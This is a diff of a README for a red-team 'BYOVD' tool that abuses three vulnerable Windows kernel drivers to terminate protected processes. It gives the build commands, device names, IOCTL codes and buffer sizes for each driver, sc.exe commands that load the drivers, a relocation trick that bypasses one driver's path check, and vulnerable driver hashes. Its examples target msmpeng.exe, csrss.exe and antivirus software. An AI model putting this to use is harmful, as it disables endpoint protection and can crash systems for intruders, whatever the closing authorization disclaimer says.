@@ -1,13 +1,37 @@
 # Terminator - Red Team Process Killer
 
-A kernel-mode process termination tool leveraging a vulnerable driver (BYOVD) to kill protected processes from user mode.
+A collection of kernel-mode process termination tools leveraging vulnerable drivers (BYOVD) to kill protected processes from user mode.
+
+## Project Structure
+
+| File | Description |
+|------|-------------|
+| `terminator.hpp` | Shared class interface for process enumeration and termination |
+| `terminator_STProcessMonitorDriver.cpp` | Exploit for STProcessMonitorDriver (IOCTL 0xB822200C) |
+| `Terminator_libwasys.cpp` | Exploit for libwasys.sys (IOCTL 0x22E00C) |
+| `terminator_MonProcessControl.cpp` | Exploit for MonProcessControl.sys (HONOR MagicSpaceTurbo, IOCTL 0x0022400C with path check bypass) |
+| `terminator.cpp` | Original implementation |
+| `ProcessMonitorDriver.sys` | STProcessMonitorDriver sample (included) |
+| `ilbwasys.sys` / `libwasys.sys` | libwasys driver samples |
+| `terminator.exe` | Precompiled binary |
 
 ## Compilation
 
-Requires MinGW-w64 (GCC) on Windows. Compile with:
+Requires MinGW-w64 (GCC) on Windows. Compile individual variants:
 
+### STProcessMonitorDriver
+```powershell
+g++ --% .\terminator_STProcessMonitorDriver.cpp -o terminator_STProcessMonitor.exe -Oz -ffunction-sections -fdata-sections -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -W
+```
+
+### libwasys.sys (WasysControl)
 ```powershell
 g++ --% .\Terminator_libwasys.cpp -o terminator_libwasys.exe -Oz -ffunction-sections -fdata-sections -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -W
+```
+
+### MonProcessControl.sys
+```powershell
+g++ --% .\terminator_MonProcessControl.cpp -o terminator_MonProcessControl.exe -Oz -ffunction-sections -fdata-sections -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -W
 ```
 
 Flags breakdown:
@@ -20,19 +44,23 @@ Flags breakdown:
 | `-Wl,--gc-sections` | Linker garbage-collects unused sections |
 | `-W` | Enable warnings |
 
-Output: standalone `terminator_libwasys.exe` (~20-30 KB stripped).
+Output: standalone executables (~20-30 KB stripped).
 
 ## Technical Focus
 
-This project demonstrates exploitation of a vulnerable kernel driver (`libwasys.sys`) that exposes an unvalidated `IOCTL_KILL` handler, allowing arbitrary process termination regardless of privileges or protection mechanisms (PPL, EPROCESS flags, etc.).
+All variants share a common architecture:
+- Enumerate running processes via `CreateToolhelp32Snapshot()` 
+- Case-insensitively match target process names
+- Continuously monitor for target processes (300ms interval)
+- Send kernel-mode termination IOCTLs to vulnerable drivers
 
-### Architecture Breakdown
+### Variants
 
-| Component | Purpose |
-|-----------|---------|
-| `Terminator_libwasys.cpp` | User-mode client that enumerates processes and sends kill IOCTLs |
-| `terminator.hpp` | Class interface for process enumeration and termination |
-| `libwasys.sys` | Vulnerable kernel driver (included as `ilbwasys.sys`) |
+| Variant | Driver Device | IOCTL | Input Size | Notes |
+|---------|---------------|-------|------------|-------|
+| STProcessMonitorDriver | `\\.\STProcessMonitorDriver` | `0xB822200C` | 8 bytes (ULONG64 PID) | CVE-2026-0828 related |
+| libwasys.sys | `\\.\WasysControl` | `0x22E00C` | 4 bytes (DWORD PID) | Direct IOCTL |
+| MonProcessControl.sys | `\\.\MonProcessControl` | `0x0022400C` | 4 bytes (DWORD PID) | Requires relocation to `C:\HONOR\MagicAnimation\MagicSpaceTurbo.exe` due to path check |
 
 ### Code Analysis
 
@@ -43,63 +71,70 @@ This project demonstrates exploitation of a vulnerable kernel driver (`libwasys.
 - Returns vector of matching PIDs
 
 **`Terminator::ProcessKill()`**
-- Opens handle to `\\.\WasysControl`
+- Opens handle to the vulnerable driver device
 - Enters infinite monitoring loop (300ms interval)
-- For each discovered PID, sends `IOCTL_KILL (0x22E00C)` with 4-byte PID buffer
+- For each discovered PID, sends the appropriate IOCTL
 - Logs only on kill attempts
+
+**`Relocate()` (MonProcessControl only)**
+- Copies executable to `C:\HONOR\MagicAnimation\MagicSpaceTurbo.exe`
+- Relaunches from there to bypass driver path validation
+- Cleans up after execution
 
 ## Usage Guide
 
 ### Prerequisites
 
-Load the vulnerable driver (requires Administrator):
+Load the appropriate vulnerable driver (requires Administrator):
 
 ```cmd
+# STProcessMonitorDriver
+sc.exe create STProcessMonitor type=kernel binPath=C:\Path\To\Driver\ProcessMonitorDriver.sys
+sc.exe start STProcessMonitor
+
+# libwasys.sys
 sc.exe create WasysControl type=kernel binPath=C:\Path\To\Driver\libwasys.sys
 sc.exe start WasysControl
-```
 
-### Exploiting an Existing Service
-
-If a vulnerable version of `libwasys.sys` is already installed and running as a service, Terminator can connect directly without loading a new driver.
-
-**Check if the service exists and is running:**
-```cmd
-sc.exe query WasysControl
+# MonProcessControl.sys
+sc.exe create MonProcessControl type=kernel binPath=C:\Path\To\Driver\MonProcessControl.sys
+sc.exe start MonProcessControl
 ```
 
 ### Run Terminator
 
+All variants use the same syntax:
+
 ```cmd
-terminator_libwasys.exe -proc <process_name1> [process_name2] ...
+<terminator_exe> -proc <process_name1> [process_name2] ...
 ```
 
-Example:
+Examples:
 ```cmd
-terminator_libwasys.exe -proc notepad.exe calc.exe
+terminator_STProcessMonitor.exe -proc notepad.exe
+terminator_libwasys.exe -proc msmpeng.exe csrss.exe
+terminator_MonProcessControl.exe -proc antivirus.exe
 ```
 
 ### Output
 
 ```
 [+] Connected to driver. Monitoring for processes...
-[*] Sending IOCTL 0x22E00C to terminate PID 4188...
+[*] Sending IOCTL 0xB822200C to terminate PID 4188...
 [+] Success! IOCTL sent for PID 4188.
 ```
 
-## Vulnerability Analysis
+For MonProcessControl, relocation messages appear first if not already in the expected path.
 
-**Vulnerability**: The driver `libwasys.sys` registers an IOCTL handler (`0x22E00C`) that:
-1. Accepts a user-supplied PID as input buffer
-2. Performs **no validation** on the PID value
-3. Calls termination functionality directly
-4. Runs in kernel context (`SYSTEM` token), bypassing all user-mode ACLs
+## Affected Versions (STProcessMonitorDriver)
 
-**Impact**: Any user with driver access can terminate:
-- Protected Processes (PPL)
-- Antivirus/EDR agents
-- Critical system processes
-- Processes with elevated privileges
+Tested vulnerable versions:
+| Version | SHA-256 |
+|---------|---------|
+| 11.11.4.0 | `70bcec00c215fe52779700f74e9bd669ff836f594df92381cbfb7ee0568e7a8b` |
+| 10.5.75.0 | `85d21ad0e0b43d122f3c9ec06036b08398635860c93d764f72fb550fb44cf786` |
+
+Other versions may be affected; verify the driver's IOCTL handler before use.
 
 ## Disclaimer
 
@@ -107,4 +142,4 @@ terminator_libwasys.exe -proc notepad.exe calc.exe
 >
 > Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse. Ensure you have written authorization before deploying in any environment.
 >
-> The vulnerable driver (`libwasys.sys`) is intentionally flawed for demonstration purposes and should **never** be deployed in production.
+> The vulnerable drivers are intentionally flawed for demonstration purposes and should **never** be deployed in production.
